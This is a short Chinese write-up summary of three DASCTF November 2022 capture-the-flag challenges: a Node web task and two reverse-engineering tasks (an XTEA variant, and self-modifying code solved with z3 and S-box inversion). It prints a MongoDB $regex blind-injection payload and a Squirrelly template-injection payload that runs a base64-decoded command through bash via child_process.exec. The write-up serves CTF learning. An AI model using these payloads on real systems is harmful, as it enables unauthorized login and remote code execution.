---
title: 2022 十一月 DASCTF WriteUp By EDISEC
contest: DASCTF 2022 11月
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [MongoDB正则注入, Squirrelly模板注入, XTEA变种, SMC自修改, z3求解, Sbox替换]
attack_chain:
  - 过滤 gt/lt/lte/gte/eq/ne/where 用 MongoDB 正则盲注
  - {"username":{"$regex":"^admi"}} 爆破 admin
  - Squirrelly 模板 autoEscape:false + 默认 filter 注入 RCE
  - require('child_process').exec('echo L2J....Q==|base64 -d|bash') 一把梭
  - babytea: XTEA 变种解密，delta XOR 0x1234567 校正
  - babysmc: cap 单字节 XOR 暴力扫 0x21/0x23 还原指令
  - z3 求解 16 字节输入满足 dword_422000 线性方程
  - 5 轮 Sbox 替换 (Fun_0x7/0xb/0xd/0x11/0x13/0x17/0x1d) 还原 flag
key_payload: '{"username":{"$regex":"^admi"},"password":{"$regex":".*"}}'
one_liner: 3 题：MongoDB 正则盲注 + Squirrelly RCE + XTEA 变种/SMC 逆向。
lesson: Squirrelly 默认 autoEscape:true 关闭 → filter 参数 RCE；XTEA 变种关键是 delta 循环的 XOR 校正。
quality: high
---

# 2022 十一月 DASCTF WriteUp By EDISEC

## 来源
- 原文：ctfiot.com/81575.html
- 团队：EDI 安全（EDISEC）

## 3 道题详解

### WEB - EzNode2（MongoDB + Squirrelly）
**Part 1 - MongoDB 注入**：
- 过滤 `gt|lt|lte|gte|eq|ne|where` → 用 `$regex` 盲注
- Payload：
  ```json
  {"username":{"$regex":"^admi"},"password":{"$regex":".*"}}
  ```
- 爆破 admin 密码

**Part 2 - Squirrelly 模板 RCE**：
- 渲染参数：`res.render('home.squirrelly', JSON.parse(data.output))`
- data.output 模板注入点：
  ```
  QQ.jpg","autoEscape":false,"defaultFilter":"e');
  require = global.require || global.process.mainModule.constructor._load;
  require('child_process').exec('echo L2J....Q==|base64 -d|bash');
  c.l('F','e
  ```
- 关闭 autoEscape + 覆盖 require + exec 一把梭

### RE - babytea（XTEA 变种）
- delta = 0x9E3779B1，但每轮 sum 高位为 0 时 XOR 0x1234567 校正
- 4 组密文，4 组 Xor0/Xor1，每组调用 decrypt 还原
- key = {0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476}（MD5 初始值）
- 还原 C 代码直接跑出 flag

### RE - babysmc（SMC 自修改）
- 用 cap 单字节 XOR 暴力扫 0x21/0x23 还原 SMC 指令
- IDA 脚本：
  ```python
  def Patch(begin, end, Xor):
      for i in range(begin, end):
          idc.patch_byte(i, Xor[i-begin])
  ```
- 还原后用 z3 求解 16 字节输入满足 dword_422000 数组的 16 个线性方程
- 5 轮 Sbox 替换还原 flag

## 关键技巧
- **XTEA 变种**：delta 循环里加 XOR 0x1234567 校正，逆向就是直接抄代码
- **SMC**：cap 反汇编 + 单字节 XOR 暴力扫
- **Squirrelly**：默认 filter 关闭后可用 `');` 闭合换 require

## 适用场景
- MongoDB 注入 + Node 模板引擎
- XTEA 变种逆向
- SMC + Sbox 替换
